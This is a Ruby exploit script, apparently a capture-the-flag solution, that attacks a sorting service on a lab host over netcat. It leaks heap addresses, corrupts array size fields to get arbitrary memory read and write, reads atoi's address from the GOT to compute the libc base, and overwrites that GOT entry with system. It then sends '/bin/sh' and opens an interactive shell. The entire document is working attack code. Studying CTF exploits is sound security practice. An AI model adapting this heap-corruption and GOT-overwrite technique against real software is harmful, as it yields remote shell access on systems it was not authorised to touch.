#!/usr/bin/env ruby


require 'rubypwn'
got_plt = 0x804D020
atoi_off = 0x0002d8e0 
system_off = 0x0003bc90
def sort(array)
	@nc.puts "sort"	
	@nc.read_until "sort: "	
	@nc.puts array.size
	array.each do |a|
		@nc.read_until ": "	
		@nc.puts a
	end
	@nc.read_until "Choose: "
end
def update(i,num)
	@nc.puts 2
	@nc.read_until "index: "	
	@nc.puts i
	@nc.read_until "number: "	
	@nc.puts num
	data =@nc.read_until "Choose: "	
end
def query(i)
	@nc.puts 1 
	@nc.read_until "index: "	
	@nc.puts i
	data =@nc.read_until "Choose: "	
	data =~ /result: (-?\d+)/
	return $1.to_i
end
def do_sort()
	@nc.puts 3
	@nc.read_until "Choose: "
	
end
def quit()
	@nc.puts 7 
@nc.read_until "$ "

end

def clear()
	@nc.puts "clear"
	@nc.read_until "$ "

end
def reload(i)
	@nc.puts "reload"
	@nc.read_until "ID: "
	@nc.puts i
	@nc.read_until "Choose: "
end


#@nc = Exec.new("./pwn1-fb39ccfa")

@nc = Exec.new("nc pwn.lab.seclover.com 11111")

@nc.read_until "$ "
# Create A1|H1
sort(Array.new(1, 1))
do_sort
mem_addr = query(1)
quit
clear

# Create A2|H2 (A1)
sort(Array.new(7, 2))
do_sort
quit

# Create A3|H3 (H1)
sort(Array.new(7, 3))
do_sort
quit

# Create A4|H4 (H4)
sort(Array.new(7, 4))
do_sort
a2_addr = query(7)
# it will overflow second history
update(7,a2_addr+32)
quit

clear
# Now we can overwrite History->data
sort(Array.new(7,13))
do_sort
query(7)
update(7,a2_addr)
quit

sort(Array.new(7,14))
do_sort
query(7)
update(7,2147483647) # over write A3->size 
quit



sort(Array.new(3,14))
do_sort
update(3,2147483647) # over write new number array's size
quit

reload(2)		#reload it, now we have free r/w to anywhere
#
new_addr = a2_addr + 92 
got_plt_offset = (0x100000000 + got_plt - new_addr )/4 

atoi_addr = s32([query(got_plt_offset)].pack("i"))

libc_base = atoi_addr - atoi_off 
system_addr = libc_base + system_off
update(got_plt_offset,system_addr - 0x100000000)
@nc.puts "/bin/sh"
puts "Mem_start_addr : 0x#{mem_addr.to_s(16)}"
puts "Rused addr : 0x#{a2_addr.to_s(16)}"
puts "New allocate addr : 0x#{new_addr.to_s(16)}"
puts "atoi addr : 0x#{atoi_addr.to_s(16)}"
puts "system addr : 0x#{system_addr.to_s(16)}"

@nc.interactive
